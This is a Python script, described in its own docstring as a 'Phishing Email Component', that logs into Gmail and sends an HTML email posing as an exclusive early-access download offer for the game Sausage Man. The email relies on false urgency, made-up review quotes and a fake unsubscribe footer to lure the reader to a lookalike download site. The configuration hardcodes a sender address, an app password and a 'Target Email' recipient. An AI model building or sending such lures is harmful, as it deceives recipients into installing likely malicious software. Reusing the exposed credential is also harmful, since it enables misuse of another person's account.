#!/usr/bin/env python3
"""
Sausage Man Game Promotion Email - Educational Purpose Only
Phishing Email Component
"""

import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def send_game_promotion_email(sender_email, sender_password, receiver_email):
    """
    Send Sausage Man game promotion email with download link
    """
    
    # Create message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "🎮 Exclusive Access: Sausage Man Battle Royale - Limited Time Download!"
    
    # HTML email body with attractive game promotion
    html_body = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
        }
        .header {
            background: linear-gradient(to right, #FF6B35, #E85A20);
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 10px 10px 0 0;
        }
        .content {
            padding: 20px;
            background-color: #f9f9f9;
        }
        .button {
            display: inline-block;
            background-color: #FF6B35;
            color: white;
            padding: 15px 30px;
            text-decoration: none;
            border-radius: 50px;
            font-weight: bold;
            margin: 20px 0;
            text-align: center;
        }
        .footer {
            padding: 15px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .screenshots {
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎮 Sausage Man Battle Royale</h1>
        <p>You've been selected for exclusive early access!</p>
    </div>
    
    <div class="content">
        <h2>Dear Mobile Gamer,</h2>
        
        <p>Congratulations! You've been selected from our waiting list to get <strong>exclusive early access</strong> to Sausage Man - the hottest new battle royale game that's taking the world by storm!</p>
        
        <p>With over <strong>100 million players</strong> worldwide and a 4.8★ rating, Sausage Man offers:</p>
        
        <ul>
            <li>🤪 Hilarious sausage character animations</li>
            <li>⚔️ Intense battle royale gameplay</li>
            <li>🎯 Unique weapons and power-ups</li>
            <li>👥 Team battles with friends</li>
            <li>💰 Special limited-time rewards for early players</li>
        </ul>
        
        <div class="screenshots">
            <p>Experience the fun that everyone is talking about:</p>
            <p>🏆 "Most addictive mobile game of the year!" - Mobile Gaming Weekly</p>
            <p>🎯 "The perfect blend of humor and competition" - Game Reviewers</p>
        </div>
        
        <center>
            <a href="https://sausage-man-app.netlify.app/" class="button">DOWNLOAD NOW - LIMITED TIME</a>
        </center>
        
        <p><strong>System Requirements:</strong><br>
        - Android 8.0+ or iOS 12+<br>
        - 2GB RAM minimum<br>
        - 500MB free storage space</p>
        
        <p>This exclusive offer expires in 48 hours. Don't miss your chance to join the Sausage Army!</p>
        
        <p>Happy gaming,<br>
        <strong>The Sausage Man Team</strong></p>
    </div>
    
    <div class="footer">
        <p>You received this email because you registered for game updates on our website or partner platforms.</p>
        <p>© 2023 Sausage Man Game Studio. All rights reserved.</p>
        <p><a href="#" style="color: #666;">Unsubscribe</a> | <a href="#" style="color: #666;">Privacy Policy</a></p>
        <p><em>This is an automated message, please do not reply to this email.</em></p>
    </div>
</body>
</html>
"""
    
    # Alternative text for email clients that don't support HTML
    text_body = """
EXCLUSIVE ACCESS: Sausage Man Battle Royale - Limited Time Download!
"""
    
    # Attach both HTML and plain text versions
    msg.attach(MIMEText(text_body, 'plain'))
    msg.attach(MIMEText(html_body, 'html'))
    
    # Send email
    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        
        print("🎮 Game promotion email sent successfully!")
        print(f"From: {sender_email}")
        print(f"To: {receiver_email}")
        print("Download URL: https://sausage-man-app.netlify.app/")
        return True
        
    except Exception as e:
        print(f"Failed to send email: {e}")
        return False

def main():
    """Main function to send the phishing email"""
    
    # Configuration
    CONFIG = {
        'sender_email': 'zodium007@gmail.com',# Sender Email
        'sender_password': 'rgvc bgje asod zhqb',# App Password
        'receiver_email': 'kyawminwai757987423@gmail.com'# Target Email
    }
    
    # Send the game promotion email
    success = send_game_promotion_email(
        CONFIG['sender_email'],
        CONFIG['sender_password'],
        CONFIG['receiver_email']
    )
    
    if success:
        print("\n📋 Game Promotion Email Details:")
        print(f"   Subject: 🎮 Exclusive Access: Sausage Man Battle Royale - Limited Time Download!")
        print(f"   Download URL: https://sausage-man-app.netlify.app/")
    else:
        print("\nFailed to send game promotion email.")

if __name__ == "__main__":
    main()
